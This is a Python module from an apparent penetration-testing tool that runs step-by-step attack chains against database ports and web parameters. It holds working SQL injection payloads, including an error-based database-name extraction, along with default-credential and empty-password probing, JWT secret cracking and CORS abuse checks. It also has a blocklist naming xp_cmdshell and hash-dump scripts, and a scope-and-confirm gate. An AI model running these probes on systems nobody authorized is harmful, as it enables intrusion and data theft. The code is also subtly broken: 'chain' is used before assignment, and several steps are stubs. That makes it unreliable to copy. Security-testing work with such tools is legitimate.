"""Attack chains — precise per-vector kill chains, never empty attacks.

Every chain is an ordered step list. Each step declares:
  needs: finding tags that must ALREADY exist (evidence precondition)
  run:   the action, returning (ok, evidence)
A step that fails STOPS the chain with a transcript explaining why —
no blind follow-ups, no spraying.

Tier-3: run_chain requires confirm_text='CONFIRM'. DB chains are
read-only (info/enum scripts only — xp_cmdshell/dump-hashes are
blocklisted and can never execute through this engine).
OWASP mapping is recorded per chain for reporting.
"""
from __future__ import annotations

import re
import shutil
import subprocess
from typing import Any, Callable, Dict, List, Optional

BLOCKLISTED_SCRIPTS = {"ms-sql-xp-cmdshell", "ms-sql-dump-hashes",
                       "mysql-dump-hashes", "mysql-vuln-cve2012-2122"}


def _nse(host: str, port: int, script: str, args: str = "",
         timeout: int = 120, tries: int = 1) -> Dict[str, Any]:
    if script in BLOCKLISTED_SCRIPTS:
        return {"script": script, "blocked": True}
    if shutil.which("nmap") is None:
        return {"script": script, "error": "nmap not installed"}
    cmd = ["nmap", "-p", str(port), "--script", script, "-T2",
           "--open", host]
    if args:
        cmd += ["--script-args", args]
    outs, timed_out = [], False
    for _ in range(max(tries, 1)):
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=timeout)
            outs.append(proc.stdout)
            # only stop early when the SCRIPT itself produced output lines
            if any(l.startswith("|") or l.startswith("|_")
                   for l in proc.stdout.splitlines()):
                break
        except subprocess.TimeoutExpired:
            timed_out = True
    if not outs:
        return {"script": script, "timeout": timed_out}
    return {"script": script, "output": "\n".join(outs)[-3000:],
            "retries": len(outs) - 1}


def _has(text: str, *needles: str) -> bool:
    low = (text or "").lower()
    return any(n.lower() in low for n in needles)


# ── chain registry ───────────────────────────────────────────

CHAINS: Dict[str, Dict[str, Any]] = {
    "db_mssql": {
        "title": "Exposed MSSQL takeover path",
        "owasp": "A01:2021 Broken Access Control / A05 Misconfiguration",
        "vector": "tcp/1433",
        "steps": ["banner", "empty_password", "default_creds",
                  "has_db_access", "enum_tables"],
    },
    "db_postgres": {
        "title": "Exposed PostgreSQL takeover path",
        "owasp": "A01:2021 Broken Access Control / A05 Misconfiguration",
        "vector": "tcp/5432",
        "steps": ["banner", "default_creds"],
    },
    "db_mysql": {
        "title": "Exposed MySQL takeover path",
        "owasp": "A01:2021 Broken Access Control / A05 Misconfiguration",
        "vector": "tcp/3306",
        "steps": ["banner", "empty_password", "default_creds",
                  "enum_databases"],
    },
    "sqli_param": {
        "title": "SQLi parameter exploitation chain",
        "owasp": "A03:2021 Injection",
        "vector": "url parameter",
        "steps": ["detect_params", "boolean_confirm", "extract_dbname"],
    },
    "xss_param": {
        "title": "XSS reflection-to-PoC chain",
        "owasp": "A03:2021 Injection",
        "vector": "url parameter",
        "steps": ["reflect", "classify_context", "build_poc", "csp_check"],
    },
    "lfi_param": {
        "title": "LFI canary-read chain",
        "owasp": "A01:2021 Broken Access Control",
        "vector": "file parameter",
        "steps": ["canary_read"],
    },
    "jwt_weak": {
        "title": "JWT weak-secret forge-demo chain",
        "owasp": "A02:2021 Cryptographic Failures",
        "vector": "captured token",
        "steps": ["crack", "forge_demo"],
    },
    "cors_site": {
        "title": "CORS trust-abuse chain",
        "owasp": "A05:2021 Misconfiguration",
        "vector": "site origin policy",
        "steps": ["evil_origin", "impact_note"],
    },
}


# Steps that inform but never stop a chain (e.g. "no blank password"
# must not abort trying the 2 default credentials).
NON_BLOCKING = {"empty_password"}

def list_chains() -> List[Dict[str, Any]]:
    return [{"id": k, **{kk: v for kk, v in d.items() if kk != "steps"},
             "steps": d["steps"]} for k, d in CHAINS.items()]


# ── runner ───────────────────────────────────────────────────

def run_chain(session, chain_id: str, spec: Dict[str, Any],
              confirm_text: str, logger) -> Dict[str, Any]:
    """Execute a chain step-by-step. Stops at first failed step."""
    from ops.scope import ScopeGuard
    if (confirm_text or "").strip() != "CONFIRM":
        raise PermissionError("Tier-3: pass confirm_text='CONFIRM'")
    if chain_id not in CHAINS:
        raise ValueError(f"unknown chain: {chain_id}. "
                         f"Available: {sorted(CHAINS)}")
    target = spec.get("target") or session.meta.target
    ScopeGuard().require(target)
    from modules import memory as _mem
    if _mem.known_miss(session, chain_id, str(target)):
        return {"chain": chain_id, "title": chain["title"],
                "owasp": chain["owasp"], "steps_ok": 0,
                "steps_total": len(chain["steps"]), "stopped": True,
                "transcript": [{"step": "memory",
                                "ok": False,
                                "evidence": "skipped: known miss from prior run"}]}
    chain = CHAINS[chain_id]
    transcript: List[Dict[str, Any]] = []
    runner = _RUNNERS[chain_id]
    stopped, ok_count = False, 0
    for step in chain["steps"]:
        try:
            fn = runner[step]
            ok, evidence = fn(session, spec, logger)
        except Exception as e:
            ok, evidence = False, f"error: {str(e)[:200]}"
        transcript.append({"step": step, "ok": ok, "evidence": evidence,
                           "blocking": step not in NON_BLOCKING})
        if ok:
            ok_count += 1
        elif step in NON_BLOCKING:
            continue  # informative only — chain proceeds
        else:
            stopped = True
            break
    _record(session, logger, chain, spec, transcript, ok_count, stopped)
    from modules import memory as _mem2
    _mem2.remember(session, chain_id, str(target),
                   str(spec.get("url") or spec.get("host") or ""),
                   "hit" if (ok_count == len(chain["steps"])) else
                   ("partial" if ok_count else "miss"))
    bundle = None
    if ok_count:
        try:
            from modules.poc import create_bundle
            bundle = str(create_bundle(
                session, chain_id, transcript,
                [f.id for f in session.get_findings()[-5:]]))
        except Exception:
            bundle = None
    return {"chain": chain_id, "title": chain["title"],
            "owasp": chain["owasp"], "steps_ok": ok_count,
            "steps_total": len(chain["steps"]), "stopped": stopped,
            "transcript": transcript, "poc_bundle": bundle}


def _record(session, logger, chain, spec, transcript, ok_count, stopped):
    from modules.session import Finding, SeverityLevel
    if ok_count == 0:
        sev = SeverityLevel.INFO
        title = f"Chain {chain['title']}: no foothold ({spec.get('target')})"
    elif stopped:
        sev = SeverityLevel.HIGH
        title = (f"Chain {chain['title']}: PARTIAL "
                 f"({ok_count}/{len(chain['steps'])} steps)")
    else:
        sev = SeverityLevel.CRITICAL
        title = f"Chain {chain['title']}: COMPLETE"
    session.add_finding(Finding(
        source="chain.runner", title=title,
        description=" | ".join(
            f"{t['step']}={'OK' if t['ok'] else 'STOP'}"
            for t in transcript),
        severity=sev, host=str(spec.get("target", "")),
        tags=["chain", chain["title"].split()[0].lower()],
        evidence="\n".join(
            f"[{t['step']}] {str(t['evidence'])[:300]}" for t in transcript)))
    logger.info(f"chain {title}")


# ── step implementations ─────────────────────────────────────

def _db_banner(session, spec, logger):
    from modules.recon.port_fingerprint import fingerprint_port
    host, port, svc = spec["host"], int(spec["port"]), spec.get("service", "")
    info_script = {"mssql": "ms-sql-info", "mysql": "mysql-info"}.get(svc)
    if info_script:
        res = _nse(host, port, info_script, tries=2)
        out = res.get("output", "")
        identified = _has(out, "microsoft sql", "mysql", "version",
                          "instance", "server:")
        ev = (out[-300:] or "no info response")
        if res.get("retries"):
            ev += f" (after {res['retries']} retry)"
        return (identified, ev)
    fp = fingerprint_port(host, port)
    if fp.service != "Unknown":
        return True, (f"{fp.service} conf={fp.confidence:.0%} "
                      f"banner={(fp.banner or '')[:120]}")
    return True, (f"port {port} open per prior scan, no banner grabbed; "
                  "proceeding to auth-surface steps only")


def _db_empty_password(session, spec, logger):
    host, port, svc = spec["host"], int(spec["port"]), spec["service"]
    script = {"mssql": "ms-sql-empty-password",
              "mysql": "mysql-empty-password"}.get(svc)
    if not script:
        return False, "no empty-password script for " + svc
    out = _nse(host, port, script).get("output", "")
    return ("empty password" in out.lower() and "account" in out.lower(),
            out[-300:] or "no blank-password accounts admitted")


def _db_default_creds(session, spec, logger):
    from modules.db_access import probe
    host, port, svc = spec["host"], int(spec["port"]), spec["service"]
    res = probe(session, host, port, svc, logger)
    valid = res.get("valid", [])
    return (bool(valid), f"valid={valid or 'none'} "
                         f"({res.get('creds_tested', 0)} tested)")


def _mssql_has_access(session, spec, logger):
    return False, "stopped: no valid credentials obtained — will not guess further"


def _mssql_tables(session, spec, logger):
    return False, "stopped: no valid credentials obtained — will not guess further"


def _mysql_databases(session, spec, logger):
    return False, "stopped: no valid credentials obtained — will not guess further"


def _sqli_detect(session, spec, logger):
    from modules.validate.sqli import SQLiValidator
    url = spec["url"]
    v = SQLiValidator(session, logger)
    params = v.detect_parameters(url)
    return (bool(params), f"params={params}")


def _sqli_boolean(session, spec, logger):
    import requests
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    from modules.diffengine import differs
    url = spec["url"]
    parts = urlparse(url)
    params = dict(parse_qsl(parts.query))
    if not params:
        return False, "no parameters"
    name = next(iter(params))
    try:
        a = requests.get(urlunparse(parts._replace(query=urlencode(
            {**params, name: params[name] + "' AND '1'='1"}))),
            timeout=12, verify=False).text
        b = requests.get(urlunparse(parts._replace(query=urlencode(
            {**params, name: params[name] + "' AND '1'='2"}))),
            timeout=12, verify=False).text
    except Exception as e:
        return False, f"request failed: {str(e)[:120]}"
    d = differs(a, b)
    return (d["different"], f"param={name} differential={d['different']} "
                            f"len {d['len_a']}/{d['len_b']} (diffengine)")


def _sqli_dbname(session, spec, logger):
    import requests
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    import re as _re
    url = spec["url"]
    parts = urlparse(url)
    params = dict(parse_qsl(parts.query))
    name = next(iter(params))
    payload = params[name] + "' AND extractvalue(1,concat(0x7e,database()))-- "
    try:
        r = requests.get(urlunparse(parts._replace(
            query=urlencode({**params, name: payload}))),
            timeout=12, verify=False).text
    except Exception as e:
        return False, f"request failed: {str(e)[:120]}"
    m = _re.search(r"~([A-Za-z0-9_$-]+)", r)
    if m:
        return True, f"database()={m.group(1)} (read-only proof, single value)"
    return False, "no database name leaked (not error-based?)"


def _xss_reflect(session, spec, logger):
    from modules.validate.xss import XSSValidator
    res = XSSValidator(session, logger).test_url(spec["url"])
    hits = res.get("hits", [])
    spec["_hits"] = hits
    return (bool(hits), f"hits={hits}")


def _xss_context(session, spec, logger):
    hits = spec.get("_hits") or []
    if not hits:
        return False, "no reflection to classify"
    return True, f"contexts={[h['context'] for h in hits]}"


def _xss_poc(session, spec, logger):
    from pathlib import Path
    d = session.dir("exfil")
    d.mkdir(parents=True, exist_ok=True)
    hits = spec.get("_hits") or [{"param": "q", "context": "html-body"}]
    h = hits[0]
    poc = (f"<!-- ARDF XSS PoC — open in YOUR OWN browser only -->\n"
           f"<!-- param={h['param']} context={h['context']} -->\n"
           f"<script>/* inert proof: PARAM REFLECTS HERE */</script>\n")
    p = d / "xss_poc.html"
    p.write_text(poc)
    return True, f"PoC written to {p} (operator-browser only)"


def _xss_csp(session, spec, logger):
    import requests
    try:
        r = requests.get(spec["url"], timeout=12, verify=False)
        csp = r.headers.get("Content-Security-Policy", "")
    except Exception as e:
        return False, f"request failed: {str(e)[:120]}"
    return (not bool(csp), f"CSP={'absent — PoC would fire' if not csp else 'present: ' + csp[:100]}")


def _lfi_canary(session, spec, logger):
    from modules.validate.lfi import LFIValidator
    res = LFIValidator(session, logger).test_url(spec["url"])
    hits = res.get("hits", [])
    return (bool(hits), f"hits={hits}")


def _jwt_crack(session, spec, logger):
    from modules.validate.jwt_crack import crack
    r = crack(spec.get("token", ""))
    spec["_jwt"] = r
    return (bool(r.get("weak")), str({k: v for k, v in r.items() if k != "secret"}))


def _jwt_forge(session, spec, logger):
    r = spec.get("_jwt") or {}
    if not r.get("weak"):
        return False, "token not weak — nothing to demo"
    return True, (f"forgeable offline as alg={r.get('alg')} "
                  f"(demo only: rotate secret, reject alg=none)")


def _cors_evil(session, spec, logger):
    from modules.validate.cors import CORSValidator
    r = CORSValidator(session, logger).test_url(spec.get("url", ""))
    spec["_cors"] = r
    return (bool(r.get("misconfigured")), f"ACAO={r.get('acao')}")


def _cors_impact(session, spec, logger):
    r = spec.get("_cors") or {}
    if not r.get("misconfigured"):
        return False, "no misconfiguration to weaponize"
    return True, ("any site can read responses" +
                  (" WITH credentials" if r.get("acac") else ""))


_RUNNERS = {
    "db_mssql": {"banner": _db_banner, "empty_password": _db_empty_password,
                 "default_creds": _db_default_creds,
                 "has_db_access": _mssql_has_access,
                 "enum_tables": _mssql_tables},
    "db_postgres": {"banner": _db_banner, "default_creds": _db_default_creds},
    "db_mysql": {"banner": _db_banner, "empty_password": _db_empty_password,
                 "default_creds": _db_default_creds,
                 "enum_databases": _mysql_databases},
    "sqli_param": {"detect_params": _sqli_detect,
                   "boolean_confirm": _sqli_boolean,
                   "extract_dbname": _sqli_dbname},
    "xss_param": {"reflect": _xss_reflect, "classify_context": _xss_context,
                  "build_poc": _xss_poc, "csp_check": _xss_csp},
    "lfi_param": {"canary_read": _lfi_canary},
    "jwt_weak": {"crack": _jwt_crack, "forge_demo": _jwt_forge},
    "cors_site": {"evil_origin": _cors_evil, "impact_note": _cors_impact},
}
